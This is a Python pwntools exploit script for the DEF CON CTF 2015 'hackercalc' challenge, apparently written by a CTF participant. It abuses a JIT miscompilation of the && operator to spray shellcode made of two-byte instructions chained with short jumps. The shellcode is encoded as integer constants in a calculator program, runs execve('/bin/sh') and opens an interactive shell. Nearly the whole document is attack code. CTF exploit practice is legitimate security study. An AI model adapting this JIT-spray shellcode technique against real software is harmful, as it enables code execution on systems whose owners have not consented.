#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context(arch='i386', os='linux', aslr=False, terminal=['tmux', 'neww'])

if args['GDB']:
    io = gdb.debug(
        './hackercalc', gdbscript='''\
        set follow-fork-mode parent
        c
    ''')
    elf = io.elf
else:
    io = process('./hackercalc')
    elf = io.elf

# thanks to https://secgroup.dais.unive.it/2015/05/19/defcon-ctf-2015-hackercalc-exploit/

# the JIT compiler outputs and then executes wrong code when using && and probably others operators
# this can be exploited to execute a shellcode

# build a shellcode for executing execve('/bin/sh') using instructions at most two bytes long
# in memory, each instruction will be placed at a constant offset from the previous one
shellcode = [
    asm('xor ecx, ecx'),
    asm('mul ecx'),
    asm('push ecx'),
    asm('mov ah, 0x68'),
    asm('mov al, 0x73'),
    asm('push ax'),
    asm('mov ah, 0x2f'),
    asm('mov al, 0x6e'),
    asm('push ax'),
    asm('mov ah, 0x69'),
    asm('mov al, 0x62'),
    asm('push ax'),
    asm('mov ah, 0x2f'),
    asm('mov al, 0x2f'),
    asm('push ax'),
    asm('mov ebx, esp'),
    asm('xor eax, eax'),
    asm('mov al, 11'),
    asm('int 0x80'),
]
assert all(len(instruction) <= 2 for instruction in shellcode)
# pad all instructions to be exactly two bytes long
shellcode = [instruction.ljust(2, asm('nop')) for instruction in shellcode]
# after each instruction of the shellcode, put a relative jump of fixed size to the next
shellcode = [instruction + '\xeb\x07' for instruction in shellcode]  # "\xeb\x07" is "jmp 0x9"

# build the program for hackercalc that executes our shellcode
ret_value = '((((v1 && 1) + 1) + 1) + 1)'
for instruction in shellcode:
    ret_value = '({} + {})'.format(ret_value, u32(instruction))

payload = '''
func f(v1, v2, v3)
\tvar v4 = {}
\treturn {}
run f(1, 1, 1)
'''.format(0x00eb0000, ret_value)
print payload
io.send(payload)

io.interactive()
